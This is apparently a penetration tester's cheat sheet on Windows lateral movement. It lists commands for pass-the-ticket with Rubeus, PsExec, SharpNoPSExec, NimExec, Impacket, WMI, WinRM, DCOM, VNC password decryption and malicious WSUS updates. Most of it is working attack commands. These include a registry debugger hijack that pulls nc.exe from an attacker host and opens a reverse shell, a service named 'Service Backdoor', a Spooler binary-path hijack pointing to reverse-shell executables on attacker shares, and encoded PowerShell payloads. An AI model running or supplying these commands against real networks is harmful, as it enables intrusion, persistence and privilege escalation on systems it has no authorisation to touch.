---
description: PSEXEC | Evil-WinRM | WMI | NimExec | SharpNoPSExec
---

# Windows Lateral Movement

### <mark style="color:yellow;">Remote Desktop Service</mark>

#### New RDP Session with Pass The Ticket

```powershell
# New Window
.\Rubeus.exe createnetonly /program:powershell.exe /show

# Forge a TGT
.\Rubeus.exe asktgt /user:mczen /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:zencorp.local /ptt

# Start RDP
mstsc.exe /restrictedAdmin
```

{% hint style="danger" %}
Restricted Admin Mode enables Pass The Hash or Pass the Ticket.

```powershell
# Check if enabled
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin

# Enable, by set to 0
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
```
{% endhint %}

### <mark style="color:yellow;">Lateral movement with PsExec, SharpNoPSExec, NimExec</mark>

<table><thead><tr><th>Tool</th><th>Functionality</th><th width="242">Features</th><th>Authentication</th><th data-hidden>Features</th></tr></thead><tbody><tr><td>PsExec</td><td>Remote command execution using SMB and named pipes</td><td>Starts a service (<code>PsExecsvc</code>), provides an interactive shell</td><td>Username/Password or NTLM</td><td></td></tr><tr><td>SharpNoPSExec</td><td>Lateral movement via service manipulation</td><td>No new services created, uses existing services with LocalSystem privileges</td><td>Username/Password or NTLM</td><td></td></tr><tr><td>NimExec</td><td>Fileless command execution via SCM Remote Protocol</td><td>Uses RPC packets and SMB for execution, cross-platform</td><td>NTLM Hash or Password</td><td></td></tr><tr><td>Reg.exe</td><td>Lateral movement via registry manipulation</td><td>Utilizes the <code>winreg</code> SMB pipe to modify registry keys, enabling RCE</td><td>Remote Registry access (Username/Password)</td><td></td></tr></tbody></table>

```powershell
# PsExec
.\PsExec.exe \\SRV02 -i -u ZENCORP\joe -p pass123 cmd

# PsExec run as system
.\PsExec.exe \\SRV02 -i -s -u ZENCORP\joe -p pass123 cmd

# SharpNoPSExec for minimal detection risk. Use nc on vm.
.\SharpNoPSExec.exe --target=172.20.1.12 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ...SNIP...AbwBzAGUsddfsAKAApAA=="

# NimExec - Use nc on vm.
.\NimExec -u zen -d zencorp.local -p pass123 -t 172.20.1.12 -c "cmd.exe /c powershell -e JABjAGwAaQBsdflAG...SNIP...AbwBzsdfsAGUAKAApAA==" -v

# Reg.exe (needs to open Edge)
reg.exe add "\\srv02.zencorp.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t reg_sz /d "cmd /c copy \\172.20.1.91\share\nc.exe && nc.exe -e \windows\system32\cmd.exe 172.20.1.91 8080"
```

#### Lateral movement from Linux

| Tool        | Functionality                                               | Features                                                                                         | Authentication            |
| ----------- | ----------------------------------------------------------- | ------------------------------------------------------------------------------------------------ | ------------------------- |
| psexec.py   | Remote command execution by creating a service              | Uploads executable to ADMIN$ share, uses RPC and named pipes for command execution               | Username/Password or NTLM |
| smbexec.py  | Executes commands on remote systems over SMB                | Runs commands without uploading files, communicates over TCP 445, uses MSRPC for service control | Username/Password or NTLM |
| services.py | Interacts quieter with Windows services via MSRPC interface | Start, stop, configure, delete, and manage services non-interactively                            | Username/Password or NTLM |
| atexec.py   | Leverages Windows Task Scheduler service                    | Appends a task to the Windows Task Scheduler to execute commands at a specific time              | Username/Password or NTLM |



```powershell
# psexec.py
psexec.py ZENCORP/john:'pass123'@172.20.1.51

# smbexec.py
smbexec.py ZENCORP/john:'pass123'@172.20.1.51

# services.py list services
services.py ZENCORP/john:'pass123'@172.20.1.51 list

# services.py Create service with venom and host on smb
services.py ZENCORP/john:'pass123'@172.20.1.51 create -name 'Service Backdoor' -display 'Service Backdoor' -path "\\\\10.10.11.201\\share\\rshell-8888.exe"

# services.py Start service
impacket-services ZENCORP/john:'pass123'@172.20.1.51 start -name 'Service Backdoor'

# service.py Delete servicee
impacket-services ZENCORP/john:'pass123'@172.20.1.51 delete -name 'Service Backdoor'

# atexec.py
atexec.py ZENCORP/john:'pass123'@172.20.1.51 "powershell -e ...SNIP...AbwBzAGUAKAApAA=="
```

#### Modify existing service using services.py. This way its possible to use the account a service is configured with, like impersonation.

```powershell
# Allow SMB Guest access in registry
reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f

# Check service configuration
impacket-services ZENCORP/john:'pass123'@172.20.1.51 config -name Spooler
Impacket v0.11.0 - Copyright 2023 Fortra                                                                                                                                                      
                                               
[*] Querying service config for Spooler
TYPE              : 272 -  SERVICE_WIN32_OWN_PROCESS  SERVICE_INTERACTIVE_PROCESS                                                                                                             
START_TYPE        :  4 -  DISABLED
ERROR_CONTROL     :  0 -  IGNORE
BINARY_PATH_NAME  : C:\Windows\System32\spoolsv.exe
LOAD_ORDER_GROUP  : SpoolerGroup    
TAG               : 0               
DISPLAY_NAME      : Print Spooler  
DEPENDENCIES      : RPCSS/http/
SERVICE_START_NAME: LocalSystem

# Modify binary path name, set start_type to 2
impacket-services ZENCORP/john:'pass123'@172.20.1.51 change -name Spooler -path "\\\\10.10.14.207\\share\\rshell-9001.exe" -start_type 2

# Start service
impacket-services ZENCORP/john:'pass123'@172.20.1.51 start -name Spooler
```

### <mark style="color:yellow;">WMI - Windows Management Instrumentation</mark>

**Windows Management Instrumentation (WMI)** is a Windows tool for system management, automation, and monitoring, using **TCP 135** and dynamic ports (**49152-65535**) for communication.

{% hint style="info" %}
It is crucial to have the necessary permissions on the target system, this means having administrative privileges.
{% endhint %}

```powershell
# Check WMi services running 
nmap -p135,49152-65535 10.129.229.244 -sV

# Or NXC
netexec wmi 10.129.229.244 -u john -p pass123

# Get OS details
wmic /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version
Get-WmiObject -Class Win32_OperatingSystem -ComputerName 172.20.0.52 | Select-Object Caption, CSDVersion, OSArchitecture, Version

# Start process remotely
wmic /node:172.20.0.52 process call create "notepad.exe"
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 172.20.0.1

# Specify credentials
wmic /user:username /password:password /node:172.20.0.22 os get Caption,CSDVersion,OSArchitecture,Version 

# Get Serial
wmic /node:172.20.0.52 os get SerialNumber
```

#### Lateral movement from Linux

```powershell
# WMIC
wmic -U zencorp.local/john%pass123 //172.20.0.11 "SELECT Caption, CSDVersion, OSArchitecture, Version FROM Win32_OperatingSystem"

# wmiexec.py
wmiexec.py zencorp/john:pass123@172.20.0.52 
wmiexec.py zencorp/john:pass123@172.20.0.52 whoami
wmiexec.py zencorp/john:pass123@172.20.0.52 whoami -nooutput

# netexec
netexec wmi 172.20.0.52 -u john -p pass123 --wmi "SELECT * FROM Win32_OperatingSystem"

# netexec Command
netexec wmi 172.20.0.52 -u john -p pass123 -x whoami
```

### <mark style="color:yellow;">Windows Remote Management - WinRM</mark>

WinRM is Microsofts version of  [WS-Management (Web Services-Management)](https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) protocol. A standard protocol for managing software and hardware remotely on port 5985 http and 5986 https.

#### Remote commands

```powershell
# Run command remotely
Invoke-Command -ComputerName srv02 -ScriptBlock { hostname;whoami }

# Using winrs
winrs -r:srv02 "powershell -c whoami;hostname"
winrs /remote:srv02 /username:john /password:pass123 "powershell -c whoami;hostname"

# Use -credential
$username = "ZENCORP\john"
$password = "pass123"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)

Invoke-Command -ComputerName 172.20.0.52 -Credential $credential -ScriptBlock { whoami; hostname }
```

#### From windows

```powershell
# Netexec check
netexec winrm 10.129.229.244 -u john -p pass123

# Copy files | 1. Create variable
$sessionSRV02 = New-PSSession -ComputerName SRV02 -Credential $credential

# Copy files | 2. ToSession
Copy-Item -ToSession $sessionSRV02 -Path 'C:\Users\joe\Desktop\Sample.txt' -Destination 'C:\Users\john\Desktop\test.txt' -Verbose

# Copy files | 3. FromSession
Copy-Item -FromSession $sessionSRV02 -Path 'C:\Users\john\Desktop\Sample.txt' -Destination 'C:\Users\joe\Desktop\test.txt' -Verbose

# Interactive shell
Enter-PSSession $sessionSRV02
```

Using hashes and tickets with WinRM

```powershell
# Forge a ticket
.\Rubeus.exe asktgt /user:james /rc4:32323DS033D176ABAAF6BEAA0AA681400 /nowrap

# Create sacrificial process
.\Rubeus.exe createnetonly /program:powershell.exe /show

# Pass the ticket
.\Rubeus.exe ptt /ticket:doIFsjCCBa6gAwIBBaEDAgEWooIEszCCBK9h...SNIP...

# Connect to target
Enter-PSSession SRV02.inlanefreight.local -Authentication Negotiate
```

## <mark style="color:yellow;">Distributed Component Object Model (DCOM)</mark>

DCOM lets programs on different computers talk to each other using port 135 dynamic ports 49152-65535 over TCP/IP.

#### Lateral movement from Windows

```powershell
# MMC20.Application
$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","172.20.0.52"));

# MMC20 Execute command
$mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==",0)
```

#### Lateral movement from Linux

```powershell
# dcomexec.py (use -no-output to disable port 445)
dcomexec.py -object MMC20 ZENCORP/John:pass123@172.20.0.52 "powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -silentcommand

# shell
impacket-dcomexec -object MMC20 ZENCORP/John:'pass123'@172.20.0.11
```

### <mark style="color:yellow;">VNC</mark>

Find VNC password

```powershell
reg query HKLM\SOFTWARE\TightVNC\Server /s
```

Decrypt

```powershell
echo -n 816ECB5CE758EAAA | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```

Connect

```powershell
vncviewer 172.20.0.10
vncviewer 172.20.0.52 -autopass 
```

### <mark style="color:yellow;">Windows Server Update Services (WSUS)</mark>

Using update distribution its possible to create a malicious patch and even reach internal servers without direct internet access, its widely used in Windows Corporate Networks.

{% hint style="info" %}
Access to the WSUS service requires administrative privileges on the server where the `WSUS service` is installed,
{% endhint %}

#### Identify WSUS Server

```powershell
# Check if WSUS server is present
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
    
# Using SharpWSUS
.\SharpWSUS.exe locate

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Locate WSUS Server
WSUS Server: http://wsus.inlanefreight.local:8530

[*] Locate complete
```

#### Inspect for more enumeration

```powershell
.\SharpWSUS.exe inspect
```

#### Create malicious update

```powershell
.\SharpWSUS.exe create /payload:"C:\sysinternals\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators john /add" /title:"NewUpdate"
```

#### Approve the update

To approve manually Windows Update Server Services > WSUS > Updates&#x20;

<pre class="language-powershell"><code class="lang-powershell"><strong>.\SharpWSUS.exe approve /updateid:431424f9-2bc8-43db-917c-d5cd2d2e8ae6 /computername:dc01.zencorp.local, /groupname:"FastUpdates"
</strong></code></pre>

#### Error: Files for this update failed to download

```powershell
# Get file name
Get-WinEvent -LogName Application | Where-Object { $_.Id -eq 364 } |fl

# Copy file
copy C:\Tools\sysinternals\PSExec64.exe C:\WSUS\WsusContent\02\0098C79E1404B4399BF086D88DBF052269A302.exe
```

